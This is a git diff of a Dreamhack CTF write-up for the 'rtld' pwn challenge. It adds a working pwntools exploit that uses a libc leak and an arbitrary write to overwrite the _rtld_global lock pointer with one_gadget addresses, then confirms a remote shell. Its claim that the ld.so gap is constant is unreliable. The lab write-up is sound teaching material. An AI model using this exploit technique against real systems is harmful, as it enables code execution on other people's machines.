@@ -2,10 +2,9 @@
 title: "[Dreamhack] rtld - Write up"
 date: 2024-01-13 00:00:00 +0700
 categories: [Dreamhack, Binary Exploitation]
-tags: [pwn, arbitrary-write, ld-so, rtld, one-gadget, dreamhack]
+tags: [pwn, arbitrary-write, rtld, one-gadget, dreamhack]
 author: datious
 ---
-
 [Write up for dreamhack]__Challenge: rtld | Author: datious
 
 1. Analyzing the source code
@@ -98,4 +97,106 @@ Write:
 
 4. Stuck on solving processing and how to debug.
 - The GAP(libc->ld.so) value was wrong:
-    + The first time, I used GAP = 0x400000 (guessing each pattern which is usually matched) -> Running on local is pass, running on server is fail. Th
+    + The first time, I used GAP = 0x400000 (guessing each pattern which is usually matched) -> Running on local is pass, running on server is fail. The reason: this number is success on local machine due to ASLR/kernel local is matched with least bit, not real constant number.
+    + Verify again by vmmap in gdb (intercept when program loaded libc+ld.so).
+
+```
+0x00007f3778981000  libc-2.23.so   (base)
+0x00007f3778d4b000  ld-2.23.so     (base)
+
+GAP = 0x00007f3778d4b000 - 0x00007f3778981000 = 0x3ca000
+```
+
+- The correct GAP is 0x3ca000. This is a constant number always correct with libc/ld.so.
+
+5. Script (Verified)
+```
+#!/usr/bin/python3
+from pwn import *
+import sys
+
+context.log_level = 'info'
+
+exe  = ELF('./rtld_patched', checksec=False)
+libc = ELF('./libc-2.23.so', checksec=False)
+ld   = ELF('./ld-2.23.so', checksec=False)
+
+REMOTE_HOST = "host3.dreamhack.games"
+REMOTE_PORT = 8786
+USE_REMOTE  = len(sys.argv) > 1 and sys.argv[1].upper() == 'REMOTE'
+
+# tất cả offset lấy từ `one_gadget libc-2.23.so`, thêm/bớt nếu list bên bạn khác
+ONE_GADGETS = [0x45226, 0x4527a, 0xf03a4, 0xcc7f0]
+
+RTLD_GLOBAL_OFF = 0x226040
+LOCK_OFF        = 0xf08
+STDOUT_OFF      = 0x3c5620
+LIBC_LD_GAP     = 0x3ca000   # nếu bạn đã verify bằng vmmap ra số khác, sửa ở đây
+
+
+def start():
+    return remote("host3.dreamhack.games",10851)
+
+
+
+def try_gadget(gadget_off, timeout=5):
+    p = start()
+    try:
+        p.recvuntil(b'stdout: ', timeout=timeout)
+        leak = int(p.recvline(timeout=timeout), 16)
+
+        libc.address = leak - STDOUT_OFF
+        ld.address   = libc.address + LIBC_LD_GAP
+
+        rtld_global = ld.address + RTLD_GLOBAL_OFF
+        lock_ptr    = rtld_global + LOCK_OFF
+        one_gadget  = libc.address + gadget_off
+
+        log.info(f"[gadget {hex(gadget_off)}] libc={hex(libc.address)} "
+                  f"ld={hex(ld.address)} lock_ptr={hex(lock_ptr)} "
+                  f"target={hex(one_gadget)}")
+
+        p.sendlineafter(b'addr: ', str(lock_ptr), timeout=timeout)
+        p.sendlineafter(b'value: ', str(one_gadget), timeout=timeout)
+
+        # sau write, process return khỏi main() -> exit() -> _dl_fini() -> gadget chạy
+        # gửi 1 lệnh + marker để xác nhận có shell thật, không phải rác/echo lỗi
+        marker = b"PWNED_%d" % gadget_off
+        p.sendline(b"echo " + marker)
+        out = p.recvrepeat(timeout=2)
+
+        if marker in out:
+            log.success(f"Gadget {hex(gadget_off)} -> SHELL OK!")
+            return p
+        else:
+            log.warning(f"Gadget {hex(gadget_off)} -> khong ra shell (output: {out[:200]})")
+            p.close()
+            return None
+    except Exception as e:
+        log.warning(f"Gadget {hex(gadget_off)} -> loi/crash: {e}")
+        try:
+            p.close()
+        except Exception:
+            pass
+        return None
+
+
+def main():
+    for g in ONE_GADGETS:
+        shell = try_gadget(g)
+        if shell is not None:
+            log.success(f"=> Dung gadget: {hex(g)}")
+            shell.interactive()
+            return
+    log.failure("Khong co gadget nao work. Can kiem tra lai LIBC_LD_GAP / offset lock_ptr "
+                "bang gdb (vmmap luc _dl_fini goi ham lock).")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+6. Remediation.
+- Don't allow the user to have write permission on the address.
+
+Goodluck!!!
